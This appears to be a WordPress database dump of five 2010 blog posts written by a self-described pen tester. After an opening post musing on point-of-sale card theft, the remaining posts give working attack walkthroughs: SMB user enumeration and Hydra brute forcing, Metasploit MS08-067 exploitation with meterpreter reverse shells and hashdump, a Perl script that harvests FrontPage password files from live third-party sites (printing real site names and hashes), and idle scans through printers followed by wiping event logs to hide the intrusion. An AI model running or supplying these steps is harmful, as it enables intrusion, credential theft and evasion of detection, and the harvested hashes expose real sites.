'74','0','open','http://www.interwebz.us/wordpress/?p=74','0','open','','2','So, I\'m going through my RSS updates and come across a post entitled:\n\n<blockquote>\n<pre>\nStillwater credit card users hit by worldwide theft\n\nSome people suspect professional hackers because bogus cards were created so quickly and spread so far.\n</pre>\n</blockquote>\n\n(<a href=\"http://www.startribune.com/local/east/90095907.html\">Click here to read the entire article</a>)\n<!--more-->\nThis got me thinking... we can do EVERYTHING in our power to ensure that we don\'t have our identity stolen.  Shred everything, including our used toilet paper, don\'t buy anything on the internet, or over the telephone, etc.. yet, there\'s absolutely nothing that we can do to protect ourselves from fraud when it comes down to the ignorance of the stores that we physically shop at or do business with.\n\nLets take a quick look at how a POS system is set up with credit card processing.\n\n1) There\'s a POS (point of sale) unit which does the check out.\n2) There\'s a server, or servers, located in some backroom, hopefully physically secured, that sends the data received from the POS to a processing company.  The processing company responds with a \"YAY\" or \"NAY\" to determine if the transaction will go through.  When approved, the processing company charges the card on behalf of the retailer.\n3) The \"YAY\" or \"NAY\" message is sent back to the POS, letting the cashier know that the transaction was approved or denied.\n\nViola, the process is complete.\n\nNow, lets look at it from the standpoint of attack vectors..\n\n1) Is the POS used for anything other than swiping cards and taking orders?  Usually they\'re not, because the POS software is the only thing that runs on these terminals.  But...\n2) How does the POS transmit the data to the server in the back?  Wired?  Wireless?  Hamsters?\n3) Is the server responsible for doing the processing used for anything other than processing transactions?  (Web browsing, email, whatever)\n4) Does the firewall prohibit data streams from being set up to send data, normally intended just for the processing company (ie - Visa), to some other destination?\n5) What type of antivirus/antispyware/antimalware is running on the server?\n6) What OS does the server use?\n7) Is the wireless network provided as a courtesy to your customers properly segregated from the business network?\n\nBig corporate companies have already learned these lessons via the school of hard knocks.. so, they\'ve spent millions doing their best to make sure that they don\'t get owned.  However, as in the story, small businesses usually don\'t.  I\'m going to take a quick stab at the set up at Mad Cappers Saloon..\n\nPOS is probably running Windows with some POS software running on it.  Employees may or may not be able to minimize the POS screen to access a web browser.  The data is probably sent to the server in the back via a wired network (because I believe this place is older than wireless.. if it were newer, I would guess wireless).  The server in the back is probably also running Windows connected to the internet via cable or DSL.. and when business is slow, I\'ll bet this computer is used for non-business related stuff.  As far as the firewall rules.... what firewall?\n\nSo, how would I target this setup?  Simple.. Send an email to the owner with a link to a website that I\'ve created that will exploit a vulnerability in his/her browser, install my personally crafted malware on their machine, which either gives me direct access into the server, or simply just sets up a sniffer to collect data streams and forward them to me.\n\nI then wait until the next business day and check my database of sniffed information, and viola.. credit cards.\n\nThere are probably a million other ways to target this set up, but that would be the most simple.\n\nSo, when the owner of Mad Cappers Saloon says, \"We\'re sorry, but this isn\'t our fault!\".. is that really true?  I mean, last I checked, ignorance isn\'t bliss.  If you get pulled over for doing 290mph in a 55 and say, \"Oh.. I haven\'t seen a speed limit sign\".. you\'re still going to jail.  So, if you get hacked and all of your customers personal financial information is compromised because you don\'t know what a firewall is, or a hidden data stream, aren\'t you equally as guilty?\n\nIn my opinion, yes, yes you are.  When I give you my card to swipe, I expect that you\'ve taken safeguards to make sure that my money isn\'t stolen due to your to your ignorance because you\'ve hired someone to set up and secure your network for you.  If you have, and my information still gets stolen, well, then it\'s the company that set up your network\'s fault.\n\nWhat I really hope to see come from this, is lawsuits.  I want to see these companies getting sued for neglecting to install proper safeguards to ensure their customers privacy and security.  If companies start to get sued because they\'ve neglected to do things the proper way, companies will start to do things properly!  It\'s unfortunate, but it\'s true.\n\nNext time you swipe your card, or give your card to the waiter/waitress.. I\'ll bet you\'ll think about this.. unfortunately, there\'s no a whole lot that you can do unless you resort back to using cash.','','2010-04-15 13:50:51','2010-04-15 18:50:51','','','2010-04-15 13:50:51','2010-04-15 18:50:51','malwarespyware-and-your-credit-card','0','','publish','Malware/Spyware and your credit card.','post',''),(
'77','2','open','http://www.interwebz.us/wordpress/?p=77','0','open','','2','I\'m doing a pen test on a Win2k3 server and I\'ve thrown the kitchen sink at this box, but to no avail.. so, I decided to result to brute force.\n\nFirst thing I need is a list of users on the box.  It\'s the PDC running AD, so there should be quite a few.  Lets find out!\n\n<blockquote>\n<pre>\n# Note: This should be a single line\nnmap -d -p445 --script=smb-enum-users x.x.x.x|perl -le \'while(<STDIN>) {\n             if(/^|.*?(w+)$/) { $h{$1}++;}} foreach $key (keys %h) { print \"$key\";}\'\n</pre>\n</blockquote>\n<!-- more -->\n\nThere must be a minor output format difference in the new version of nmap, so if you\'re on the bleeding edge, use this one liner instead:\n<blockquote>\n<pre>\n# Note: This should be a single line\nnmap -d -p445 --script=smb-enum-users 10.0.0.5|perl -le \'while(<STDIN>) {\n            if(/^|.*?(w+.*?)s+.*/) { $h{$1}++;}} foreach $key (keys %h) { print \"$key\";}\'\n</pre>\n</blockquote>\n\n52 accounts.  \n\nThats a lot of targets.. so I run that and redirect the output to \'users.txt\'\n\nNow, I have a password dictionary of about 1.7 million words that I created from a number of different places.. and a list of 52 users.  Enter Hydra.  :-)\n\n<blockquote>\n<pre>\nhydra -L users.txt -P cleanlist.txt x.x.x.x smb\n[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)\nHydra v5.4 (c) 2006 by van Hauser / THC - use allowed only for legal purposes.\nHydra (http://www.thc.org) starting at 2010-04-21 11:15:00\n[DATA] 1 tasks, 1 servers, 934224200 login tries (l:52/p:17965850), ~934224200 tries per task\n[DATA] attacking service smb on port 139\n</pre>\n</blockquote>\n\nAnd now we wait.\n\nThis is a short-but-sweet post because I just really wanted to highlight the beauty of NSE (nmap script engine) and some of the scripts that come with nmap.','','2010-04-21 13:04:32','2010-04-21 18:04:32','','','2010-04-21 13:04:32','2010-04-21 18:04:32','enumerating-windows-users-via-smb','0','','publish','Enumerating Windows users via SMB','post',''),(
'80','3','open','http://www.interwebz.us/wordpress/?p=80','0','open','','2','While I was waiting for my brute force attack to complete against the PDC.. I needed to find another way in that wasn\'t going to take forever.  So, while that was running.. I used the NSE \'smb-check-vulns\' script to see if there were any systems on the network that the admin neglected to patch.\n\n<!--more-->\n<blockquote>\n<pre>\nnmap -p445 --script=smb-check-vulns 192.168.0.*|perl -le \'while(<STDIN>){\nif(/^.*?((d+.d+.d+.d+)):$/) { $i = $1; } if(/^|_s+(.*?):s+VULNERABLE$/ && $i ne \"\") \n{ print \"$i is vulnerable to $1\"; }}\'\n\n192.168.0.5 is vulnerable to MS08-067\n192.168.0.7 is vulnerable to MS08-067\n192.168.0.11 is vulnerable to MS08-067\n</pre>\n</blockquote>\n\nUhoh.. :-)\n\nThrough the research that I\'ve done, I know that .5 is a file server, .7 is just a regular workstation, and .11 is actually the security system for their office.. like, it controls the physical access to the building.  Not good.\n\n<blockquote>\n<pre>\nmsf > use windows/smb/ms08_067_netapi\nmsf exploit(ms08_067_netapi) > set payload windows/meterpreter/reverse_tcp\npayload => windows/meterpreter/reverse_tcp\nmsf exploit(ms08_067_netapi) > set RHOST 192.168.0.11\nRHOST => 192.168.0.11\nmsf exploit(ms08_067_netapi) > set LHOST 192.168.0.100\nLHOST => 192.168.0.100\nmsf exploit(ms08_067_netapi) > exploit\n\n.....\n[*] Meterpreter session 1 opened (192.168.0.100:4444 -> 192.168.0.11:1251)\nmeterpreter > pwd\nC:WINNTsystem32\n</pre>\n</blockquote>\n\nThe whole process took less than a minute.  From here, if I were actually attacking this network instead of just pen testing, I would inject a VNC DLL and get remote access to the desktop, allowing me to literally control physical access to their office.  IE - lets just turn off the security system so I can walk right into the building after hours without having to use a pesky fob.\n\nPatch your systems, people.  Windows automatic update is your friend.\n','','2010-04-21 14:55:41','2010-04-21 19:55:41','','','2010-04-21 14:55:41','2010-04-21 19:55:41','nmaps-nse-smb-check-vulns-script','0','','publish','Nmap\'s NSE \'smb-check-vulns\' script','post',''),(
'92','3','open','http://www.interwebz.us/wordpress/?p=92','0','open','','2','So, this is a very, very well known Google hack that I\'ve automated to make life easier.  It\'s the simple \'<a href=\"http://www.google.com/search?q=inurl:(service|authors|administrators|users)%20ext:pwd%20%22%23%20-FrontPage-%22&hl=en&num=500&sa=N\">inurl:service.pwd</a>\' hack.\n\nHere\'s the code:\n\n<pre lang=\"perl\" line=\"1\">\nuse LWP::UserAgent;     \nuse HTTP::Cookies; \n<!--more-->\n$ua=LWP::UserAgent->new;\n$ua->cookie_jar(HTTP::Cookies->new(file => \"$ENV{HOME}/.cookies.txt\"));\n$ua->agent(\"Internet Explorer 6.6.6, Lucifer Edition\");\n# Make sure the \'$req =\' line is on a single line.\n$req = HTTP::Request->new(GET=>\"http://www.google.com/search?q=inurl:\n          (service|authors|administrators|users)+ext:pwd+%22%23+-FrontPage-%22&hl=en&num=500&sa=N\");\n\n@data=$ua->request($req)->as_string;\n\nopen(F, \">>/tmp/web\") || die \"$!\";\n\nforeach $line (@data) {\n  $line =~ s/</.*?>/n/g;\n  print F \"$linen\";\n}\nclose(F);\n\nopen(F, \"/tmp/web\") || die \"$!\";\n\nwhile(<F>) {\n  if(/^.*?a href=\"(http.*?.pwd)\".*/) {\n    push(@pwd, \"$1\");\n  } else { \n    next;  \n  }\n}  \nif(-e \"/tmp/web\") {\n  system(\"rm /tmp/web\");\n}\n \nforeach $line (@pwd) {\n  if($line =~ /analytics/) { next; }\n  $grab=LWP::UserAgent->new;\n  $grab->agent(\"Internet Explorer 6.0\");\n  $request = HTTP::Request->new(GET=>\"$line\");\n  @passwords=$grab->request($request)->as_string;\n  foreach $passwd (@passwords) {\n    open(PWDFILE, \">>/tmp/passwords\") || die \"$!\";\n    print PWDFILE $passwd;\n    close(PWDFILE);\n    open(PWDFILE, \"/tmp/passwords\") || die \"$!\";\n    print \"Website: $linen\";\n    while(<PWDFILE>) {\n      if(/# -FrontPage-/) { $ct = \"1\"; }\n      if($ct ne \"\") {\n        print;\n      } else {\n        next; \n      }\n    }  \n    $ct = \"\";\n    print \"nn\";\n    close(PWDFILE);\n    if(-e \"/tmp/passwords\") {\n      system(\"rm /tmp/passwords\");\n    }\n  }  \n}    \n</pre>\n\nThat produces the following:\n\n<blockquote>\n<pre>\n./googlehax.pl\nWebsite: http://www.visual-shock.com/_vti_pvt/users.pwd\n# -FrontPage-\nvisual-shock.com:g4SGndwsuchq2\n\nWebsite: http://www.visual-shock.com/_vti_pvt/service.pwd\n# -FrontPage-\nvisual-shock.com:ih0k5mlGINzf.\n\nWebsite: http://conca.users.netlink.co.uk/_vti_pvt/service.pwd\n# -FrontPage-\njuan:KlN.3BHTNuMlI\n</pre>\n</blockquote>\n\nSo, it produces the website, the username, and the encrypted password found in the service.pwd file.  These are standard DES encrypted passwords that are easily cracked using one of the hundreds of password crackers available.  I run Linux, so I prefer John, because it\'s the oldest and best.  Period.\n\nSimply redirect the output from the \'googlehax.pl\' file to a file called, say, \"passwords.txt\" and run John against it using a big wordlist.. and viola.\n\n\n','','2010-04-21 18:30:02','2010-04-21 23:30:02','','','2010-04-21 18:30:02','2010-04-21 23:30:02','old-school-google-hacking','0','','publish','Old school Google hacking++','post',''),(
'108','1','open','http://www.interwebz.us/wordpress/?p=108','0','open','','2','I don\'t see a whole lot on the forums about owning printers during a pen test, so I figured I\'d post some stuff here.\n\nFirst, printers are often overlooked when it comes to securing a network.  Why?  Because all they\'re supposed to do is print.  You plug them in, install a driver, and so long as the end user can print, all is well in the world.\n\nThanks to this misconception, we can use network printers to gather boat loads of information, as well, as bounce through them when port scanning, cause disruption, and, well, screw with people.  ;-)\n<!--more-->\n\nFirst, printers are PERFECT boxes to use when doing a bounce (aka, IPID, zombie, idle, etc.) scan.  Example:\n\n<blockquote>\n<pre>\nnmap -sS -p9100 10.0.0.* --open\n..snip..\nNmap scan report for 10.0.0.23\nHost is up (0.00055s latency).\nPORT     STATE SERVICE\n9100/tcp open  jetdirect\n..snip..\n</pre>\n</blockquote>\n\nOk, so we know that .23 is a printer.  Yay.. lets see how much activity this thing is seeing at the moment..\n\n<blockquote>\n<pre>\nhping3 10.0.0.23 -r -p 31337\nHPING 10.0.0.23 (eth0 10.0.0.23): NO FLAGS are set, 40 headers + 0 data bytes\nlen=46 ip=10.0.0.23 ttl=64 id=54757 sport=31337 flags=RA seq=0 win=0 rtt=0.6 ms\nlen=46 ip=10.0.0.23 ttl=64 id=+1 sport=31337 flags=RA seq=1 win=0 rtt=0.9 ms\nlen=46 ip=10.0.0.23 ttl=64 id=+1 sport=31337 flags=RA seq=2 win=0 rtt=0.7 ms\nlen=46 ip=10.0.0.23 ttl=64 id=+1 sport=31337 flags=RA seq=3 win=0 rtt=0.7 ms\nlen=46 ip=10.0.0.23 ttl=64 id=+1 sport=31337 flags=RA seq=4 win=0 rtt=0.8 ms\n</pre>\n</blockquote>\n\nSweet.. each IP ID is incremented by 1, this indicates that there\'s no other traffic on this printer at the moment.  We can use this to bounce through when doing a scan against the PDC..\n\n<blockquote>\n<pre>\nnmap -Pn -sI 10.0.0.23:31337 -p21,22,139,445 10.0.0.5\n\nIdle scan using zombie 10.0.0.23 (10.0.0.23:31337); Class: Incremental\nNmap scan report for 10.0.0.5\nHost is up (0.017s latency).\nPORT    STATE           SERVICE\n21/tcp  closed|filtered ftp\n22/tcp  closed|filtered ssh\n139/tcp open            netbios-ssn\n445/tcp open            microsoft-ds\n</pre>\n</blockquote>\n\nNice.. I think we found our target..\n\n<blockquote>\n<pre>\nsnmpwalk -c public -v1 10.0.0.5|grep Windows\n..snip..\nHOST-RESOURCES-MIB::hrSWInstalledName.22 = STRING: \"Windows Server 2003 Service Pack 2\"\n..snip..\n\nnmap -p445 --script=smb-check-vuln* 10.0.0.5|grep VULN\n|   MS08-067: VULNERABLE\n</pre>\n</blockquote>\n\nOk, so we definitely found our target..\n\n<blockquote>\n<pre>\nmsfcli windows/smb/ms08_067_netapi payload=windows/meterpreter/reverse_tcp RHOST=10.0.0.5 TARGET=8 LHOST=10.0.0.58 E\n[*] Please wait while we load the module tree...\n[*] Started reverse handler on 10.0.0.58:4444 \n[*] Attempting to trigger the vulnerability...\n[*] Sending stage (748032 bytes) to 10.0.0.5\n[*] Meterpreter session 1 opened (10.0.0.58:4444 -> 10.0.0.5:2371)\n\nmeterpreter > hashdump\nAdministrator:500:passwordhashhere:::\nGuest:501:passwordhashhere:::\nkrbtgt:502:passwordhashhere:::\n</pre>\n</blockquote>\n\nThe initial scan will look like it came from 10.0.0.23.. after exploited, I\'ll clean out the event log, so the only thing the admin would see is that one of his printers port scanned his PDC, and that\'s only if he\'s running some kind of network monitor outside of the event log.  That\'s also assuming that I don\'t turn on remote desktop, connect, and clean out that log, too.  ;-)\n','','2010-04-30 11:16:47','2010-04-30 16:16:47','','','2010-04-30 11:16:47','2010-04-30 16:16:47','fun-with-printers-part-1','0','','publish','Fun with printers (part 1)','post','');
